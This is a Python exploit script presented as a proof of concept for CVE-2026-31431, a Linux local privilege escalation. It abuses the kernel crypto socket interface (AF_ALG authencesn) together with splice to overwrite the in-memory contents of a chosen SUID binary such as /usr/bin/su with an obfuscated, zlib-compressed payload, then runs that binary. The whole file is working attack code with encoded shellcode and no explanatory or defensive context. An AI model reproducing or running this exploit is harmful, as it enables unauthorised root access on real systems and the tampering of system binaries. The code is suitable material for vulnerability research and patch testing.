#!/usr/bin/env python
from __future__ import print_function,unicode_literals
import os as g,zlib,socket as s,ctypes,ctypes.util,sys,time,signal
import binascii
import argparse

if not hasattr(g,'splice'):
 libc=ctypes.CDLL(ctypes.util.find_library('c'),use_errno=True)
 def _splice(src,dst,count,offset_src=None,offset_dst=None,flags=0):
  ctypes.set_errno(0)
  if offset_src is not None:_oi=ctypes.c_longlong(offset_src);pi=ctypes.byref(_oi)
  else:pi=None
  if offset_dst is not None:_oo=ctypes.c_longlong(offset_dst);po=ctypes.byref(_oo)
  else:po=None
  r=libc.splice(ctypes.c_int(src),pi,ctypes.c_int(dst),po,ctypes.c_size_t(count),ctypes.c_uint(flags))
  if r==-1:raise OSError(ctypes.get_errno(),'splice failed')
  return r
 g.splice=_splice;print("[V] splice loaded")

def d(x):
 if isinstance(x,str):x=x.encode('ascii')
 return binascii.unhexlify(x)

def b(x):
 if isinstance(x,bytes):return x
 return x.encode('ascii')

def c(f,t,chunk):
 try:
  a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt
  v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00')
  u.sendmsg([b("A")*4+chunk],[(h,3,i*4),(h,2,b("\x10")+i*19),(h,4,b("\x08")+i*3)],32768)
  r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o);g.close(r);g.close(w)
  try:u.recv(8+t)
  except:pass
  u.close();a.close()
 except:pass

if __name__=="__main__":
 parser = argparse.ArgumentParser(description="CVE-2026-31431 SUID custom target PoC")
 parser.add_argument("-t", "--target", required=True, help="Path to SUID binary to exploit (e.g., /usr/bin/su)")
 args = parser.parse_args()
 target = args.target

 print("="*60);print("CVE-2026-31431");print("="*60)
 print("[*] Target: {}".format(target));sys.stdout.flush()

 e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
 print("[*] {}B {}loops".format(len(e),len(e)//4));sys.stdout.flush()
 pid=g.fork()
 if pid==0:
  f=g.open(target,0);i=0
  while i<len(e):c(f,i,e[i:i+4]);i+=4
  g.close(f);g._exit(0)
 deadline=time.time()+60;killed=False
 while True:
  p,status=g.waitpid(pid,g.WNOHANG)
  if p!=0:break
  if time.time()>deadline:g.kill(pid,signal.SIGKILL);g.waitpid(pid,0);killed=True;break
  time.sleep(0.1)
 if killed:print("[TIMEOUT]");sys.exit(1)
 if g.WIFEXITED(status) and g.WEXITSTATUS(status)==0:
  print("[*] Write done");sys.stdout.flush();g.system(target)
 else:print("[FAIL]")
 print("\n[DONE]")
